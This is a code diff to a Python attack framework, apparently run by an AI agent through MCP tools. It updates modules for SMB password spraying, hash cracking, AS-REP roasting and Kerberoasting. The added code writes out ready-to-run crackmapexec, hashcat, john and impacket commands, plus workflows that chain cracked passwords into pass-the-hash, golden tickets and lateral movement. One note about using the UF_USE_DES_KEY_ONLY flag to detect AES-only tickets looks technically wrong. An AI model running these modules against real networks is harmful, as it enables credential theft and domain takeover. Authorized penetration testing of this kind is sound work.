@@ -14,12 +14,20 @@ class CredentialSpray(AttackModule):
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Sprays common passwords against discovered services. Use with rate limiting.",
-            "suggested_command": f"crackmapexec smb {ctx.target_ip} -u users.txt -p passwords.txt",
-        }
+        return self._info_result(
+            ctx,
+            note=(
+                "Grid spray (many users x many passwords) -- HIGH lockout risk. "
+                "Check lockoutThreshold via ADLDAPEnum first. Prefer PasswordSpray "
+                "(one password, many users) for lockout-safe spraying. "
+                "crackmapexec is Linux-only; on Windows chain to the password_spray "
+                "MCP tool (stdlib HTTP)."
+            ),
+            evidence=[f"credential spray planned against {ctx.target_ip}"],
+            references=["https://www.thehacker.recipes/a-d/movement/credentials/spraying"],
+            suggested_command=f"crackmapexec smb {ctx.target_ip} -u users.txt -p passwords.txt --continue-on-success",
+            prerequisites=["lockout policy checked (lockoutThreshold via ADLDAPEnum)", "user list from ADLDAPEnum/SMBNullSession"],
+        )
 
 
 # ---------------------------------------------------------------------------
@@ -39,7 +47,16 @@ class PasswordSpray(AttackModule):
             "status": "script_generated",
             "module": self.name,
             "script": script,
-            "note": "Sprays common passwords across many usernames. Low-and-slow to avoid lockouts.",
+            "note": (
+                "Sprays common passwords across many usernames. Low-and-slow to "
+                "avoid lockouts. For AD/SMB targets prefer the password_spray MCP "
+                "tool (nxc-based); this script targets web /api/login."
+            ),
+            # Phase 3: a successful spray yields credentials -- declare the
+            # finding shape so record_success surfaces it.
+            "credentials_found": ["<VALID_CREDS: printed by script on SUCCESS>"],
+            "evidence": [f"password spray queued against {ctx.target_ip}"],
+            "references": ["https://www.thehacker.recipes/a-d/movement/credentials/spraying"],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -125,16 +142,25 @@ class HashCrack(AttackModule):
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Cracks NTLM, NetNTLMv1/v2, Kerberos TGS, MD5, SHA, bcrypt, and more.",
-            "suggested_commands": [
+        return self._info_result(
+            ctx,
+            note=(
+                "Cracks NTLM, NetNTLMv1/v2, Kerberos TGS, MD5, SHA, bcrypt, and "
+                "more. LOCAL-ONLY utility (no target touch) -- chain from "
+                "DumpHashes/DCSync/Kerberoasting/ASREPRoast. Prefer the "
+                "run_hash_crack MCP tool which auto-identifies the mode via "
+                "_identify_hash_modes; cracked plaintext feeds cred_store_add "
+                "then PassTheHash/GoldenTicket."
+            ),
+            evidence=["<CRACKED_POT: exploit_workspace/<ip>/<attempt>/hash.txt.potfile>"],
+            references=["https://hashcat.net/wiki/doku.php?id=example_hashes"],
+            suggested_commands=[
+                f"run_hash_crack(hash_value='<hash>', tool='hashcat')  # auto-identifies mode",
                 f"hashcat -m 1000 -a 3 ntlm_hashes.txt ?l?l?l?l?l?l?l?l",
                 f"hashcat -m 5600 -a 0 netntlmv2_hashes.txt rockyou.txt -r best64.rule",
                 f"john --wordlist=rockyou.txt --rules hashes.txt",
             ],
-            "hash_modes": {
+            hash_modes={
                 "0": "MD5",
                 "1000": "NTLM",
                 "13100": "Kerberos 5 TGS-REP etype 23",
@@ -142,7 +168,7 @@ class HashCrack(AttackModule):
                 "18200": "Kerberos 5 AS-REP etype 23",
                 "3200": "bcrypt",
             },
-        }
+        )
 
 
 # ---------------------------------------------------------------------------
@@ -157,60 +183,71 @@ class ASREPRoast(AttackModule):
     name = "ASREPRoast"
     description = "AS-REP Roasting: request TGTs for accounts with 'Do not require Kerberos preauthentication' and crack the offline-extractable encrypted payload"
     target_services = ["kerberos"]
-    target_ports = [88]
+    target_ports = [88, 389]
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "AS-REP roasts accounts with UF_DONT_REQUIRE_PREAUTH set. Offline crackable via hashcat -m 18200.",
-            "workflow": [
-                "1. Gather a username list (LDAP enum against ctx.target_ip, or use ADLDAPEnum) to feed candidates.",
-                f"2. Call asrep_roast(target_ip='{ctx.target_ip}', domain=<d>, username=<u>, password=<p> or ntlm_hash=<nt>, users_file=<optional>) to request AS-REPs for preauth-disabled accounts (impacket-GetNPUsers).",
-                "3. Call write_python_file + run_python_file with 'hashcat -m 18200 asrep.txt rockyou.txt' to crack the recovered AS-REP hashes offline on the operator box.",
-                "4. Validate recovered plaintext against the target with lateral_exec / dump_credentials as needed.",
-            ],
-            "suggested_command": (
-                f"impacket-GetNPUsers -dc-ip {ctx.target_ip} -request "
-                f"DOMAIN/user:password -format hashcat -usersfile users.txt"
+        return self._info_result(
+            ctx,
+            note=(
+                "AS-REP roasts accounts with UF_DONT_REQUIRE_PREAUTH set. "
+                "Offline crackable via hashcat -m 18200. Chain: ADLDAPEnum "
+                "(preauth-disabled candidates) -> asrep_roast -> run_hash_crack "
+                "-> PassTheHash."
             ),
-            "references": [
+            evidence=["<ASREP_HASHES_FILE: exploit_workspace/<ip>/<attempt>/asrep_hashes.txt>"],
+            references=[
                 "https://posts.specterops.io/kerberoasting-and-as-rep-roasting-a1f1ec0ec0ec",
                 "https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py",
                 "https://hashcat.net/wiki/doku.php?id=example_hashes (mode 18200)",
             ],
-        }
+            suggested_command=(
+                f"impacket-GetNPUsers -dc-ip {ctx.target_ip} -request "
+                f"DOMAIN/user:password -format hashcat -usersfile users.txt"
+            ),
+            workflow=[
+                "1. Gather a username list (ADLDAPEnum output) to feed candidates.",
+                f"2. Call asrep_roast(target_ip='{ctx.target_ip}', domain=<d>, username=<u>, password=<p> or ntlm_hash=<nt>, users_file=<from ADLDAPEnum>) -- writes asrep_hashes.txt.",
+                "3. Call run_hash_crack(hash_value=<each $krb5asrep$23$... line>, tool='hashcat') -- auto-identifies mode 18200.",
+                "4. Cracked plaintext -> cred_store_add -> PassTheHash / lateral_exec against the owned target only.",
+            ],
+        )
 
 
 class Kerberoasting(AttackModule):
     name = "Kerberoasting"
     description = "Kerberoasting: request TGS tickets for SPN-backed accounts and crack the offline-extractable service-ticket hash (etype 23 / RC4-HMAC)"
     target_services = ["kerberos"]
-    target_ports = [88, 464]
+    target_ports = [88, 389]
     required_cves = []
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Wraps the existing kerberoast MCP tool. TGS-REP etype 23 cracks with hashcat -m 13100.",
-            "workflow": [
-                f"1. Call kerberoast(target_ip='{ctx.target_ip}') to request TGS tickets for all SPN-backed service accounts from the domain controller.",
-                "2. The MCP tool writes TGS-REP hashes (hashcat format) into the per-target workspace exploit_workspace/{ctx.target_ip}/.",
-                "3. Call write_python_file + run_python_file with 'hashcat -m 13100 tgs.txt rockyou.txt' to crack the tickets offline on the operator box.",
-                "4. Service accounts are frequently over-privileged -- escalate recovered plaintext via lateral_exec / dump_credentials against the owned target only.",
-            ],
-            "suggested_command": (
-                f"impacket-GetUserSPNs -request -dc-ip {ctx.target_ip} "
-                f"DOMAIN/user:password -format hashcat"
+        return self._info_result(
+            ctx,
+            note=(
+                "Wraps the existing kerberoast MCP tool. TGS-REP etype 23 cracks "
+                "with hashcat -m 13100. Crackable only when SPN accounts permit "
+                "RC4-HMAC (etype 23); AES-only (etype 17/18) tickets are not "
+                "practically crackable -- check userAccountControl for "
+                "UF_USE_DES_KEY_ONLY (0x200000) via ADLDAPEnum first."
             ),
-            "references": [
+            evidence=["<TGS_HASHES_FILE: exploit_workspace/<ip>/<attempt>/kerberoast_tickets.txt>"],
+            references=[
                 "https://harmj0y.medium.com/kerberoasting-0ce2de1ec0ec",
                 "https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py",
                 "https://hashcat.net/wiki/doku.php?id=example_hashes (mode 13100)",
             ],
-        }
+            suggested_command=(
+                f"impacket-GetUserSPNs -request -dc-ip {ctx.target_ip} "
+                f"DOMAIN/user:password -format hashcat"
+            ),
+            workflow=[
+                f"1. Call kerberoast(target_ip='{ctx.target_ip}') to request TGS tickets for all SPN-backed service accounts from the domain controller.",
+                "2. The MCP tool writes TGS-REP hashes (hashcat format) into the per-target workspace exploit_workspace/{ctx.target_ip}/.",
+                "3. Call run_hash_crack(hash_value=<each $krb5tgs$23$... line>, tool='hashcat') -- auto-identifies mode 13100. Cracked plaintext -> cred_store_add -> lateral_exec / PassTheHash.",
+                "4. Service accounts are frequently over-privileged -- escalate recovered plaintext via lateral_exec / dump_credentials against the owned target only.",
+            ],
+        )
 
 
 class DCSyncAttack(AttackModule):
